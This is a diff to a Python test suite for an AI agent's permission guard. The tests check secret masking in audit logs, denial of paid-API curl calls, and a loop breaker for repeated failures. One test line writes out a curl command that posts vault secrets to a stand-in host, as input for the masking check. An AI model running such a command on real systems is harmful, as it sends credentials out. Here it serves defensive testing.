@@ -163,3 +163,17 @@ def test_the_audit_masks_secrets(tmp_path, monkeypatch):
     pg.audit("leak", "Bash", "why", f"curl x -d {VAULT_VALUE} {SECRET}", [VAULT_VALUE])
     line = (tmp_path / "a.jsonl").read_text()
     assert VAULT_VALUE not in line and SECRET not in line and "[secret]" in line
+
+
+def test_the_sdk_hooks_deny_with_the_reason_and_pass_the_loop_breaker_context(tmp_path, monkeypatch):
+    import asyncio
+    import loop_breaker
+    import sdk_engine
+    monkeypatch.setattr(pg, "AUDIT", tmp_path / "a.jsonl")
+    guard_hook = sdk_engine.guard_hook(pg.Guard(secrets=[], cwd=str(tmp_path)))
+    out = asyncio.run(guard_hook({"tool_name": "Bash", "tool_input": {"command": "curl https://api.openai.com/v1/x"}}, None, None))
+    assert out["hookSpecificOutput"]["permissionDecision"] == "deny" and "SPEND" in out["hookSpecificOutput"]["permissionDecisionReason"]
+    assert asyncio.run(guard_hook({"tool_name": "Bash", "tool_input": {"command": "ls"}}, None, None)) == {}
+    loop = sdk_engine.loop_hook(loop_breaker.LoopBreaker())
+    seen = [asyncio.run(loop({"tool_name": "Bash", "tool_input": {"command": "make x"}, "tool_response": "Error: boom"}, None, None)) for _ in range(3)]
+    assert seen[0] == {} and "failed 3 times" in seen[2]["hookSpecificOutput"]["additionalContext"]
